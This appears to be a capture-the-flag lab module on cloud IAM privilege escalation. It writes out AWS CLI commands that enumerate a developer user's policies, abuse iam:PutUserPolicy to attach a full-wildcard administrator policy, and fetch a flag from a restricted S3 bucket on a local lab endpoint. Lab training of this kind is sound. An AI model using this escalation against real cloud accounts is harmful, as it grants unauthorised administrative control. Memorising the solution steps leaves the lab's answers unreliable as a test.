# Module 4: Cloud Privilege Escalation

## Objective
Enumerate the current user's IAM permissions, discover a privilege escalation vulnerability, and exploit it to gain Administrator rights.

## Background
Identity and Access Management (IAM) controls access to resources. A dangerous misconfiguration is granting users self-modification privileges, such as `iam:PutUserPolicy`, which allows them to write and attach policies to their own identity.

## Steps to Solve
1. List the inline policies attached to the `developer` user:
   ```bash
   aws iam list-user-policies --user-name developer --endpoint-url http://10.20.0.10:4566
   ```
2. Retrieve the policy content to inspect your permissions:
   ```bash
   aws iam get-user-policy --user-name developer --policy-name DeveloperInitialPolicy --endpoint-url http://10.20.0.10:4566
   ```
3. You will notice you have the `iam:PutUserPolicy` permission. Abuse this permission to attach an administrator policy to your user profile:
   ```bash
   aws iam put-user-policy --user-name developer --policy-name AdminPolicy --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' --endpoint-url http://10.20.0.10:4566
   ```
4. This command elevates your user to Administrator. The backend monitoring thread will automatically detect this escalation and provision the restricted S3 bucket.
5. Download the Stage 4 flag from the restricted bucket (name shown in connection details panel):
   ```bash
   aws s3 cp s3://[your-restricted-bucket-name]/flag4.txt - --endpoint-url http://10.20.0.10:4566
   ```
6. Submit the flag on the dashboard to unlock Module 5.
